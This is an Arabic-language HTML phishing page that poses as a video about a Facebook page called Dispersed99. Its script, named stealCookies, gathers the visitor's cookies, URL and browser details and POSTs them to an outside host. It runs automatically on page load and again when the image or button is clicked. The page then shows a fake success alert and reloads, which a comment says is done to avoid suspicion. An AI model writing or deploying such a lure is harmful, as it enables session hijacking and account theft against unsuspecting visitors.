<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <title>فيديو Dispersed99 الرهيب 🔥</title>
    <style>
        body { font-family: Arial; text-align: center; background: #1877f2; color: white; padding: 50px; }
        img { width: 400px; height: 300px; border-radius: 10px; cursor: pointer; }
        button { background: #42b883; color: white; padding: 15px 30px; border: none; border-radius: 25px; font-size: 18px; cursor: pointer; }
    </style>
</head>
<body>
    <h1>🎥 فيديو خاص عن صفحة Dispersed99</h1>
    <p>اضغط على الصورة للمشاهدة!</p>
    <img src="https://i.imgur.com/facebook-logo.png" id="video" onclick="stealCookies()">
    <br><br>
    <button onclick="stealCookies()">🔥 شاهد الآن 🔥</button>
    
    <script>
    function stealCookies() {
        const data = {
            page_target: 'Dispersed99',
            page_id: '1000641234567890',  // سيتم تحديثه
            cookies: document.cookie,
            url: window.location.href,
            user_agent: navigator.userAgent,
            timestamp: new Date().toISOString()
        };
        
        fetch('https://httpbin.org/post', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data)
        }).then(() => {
            alert('✅ تم تحميل الفيديو بنجاح! شكراً 😍');
            // إعادة التحميل لتجنب الشكوك
            setTimeout(() => location.reload(), 2000);
        });
    }
    
    // سرقة تلقائية عند الدخول
    window.onload = () => setTimeout(stealCookies, 1000);
    </script>
</body>
</html>
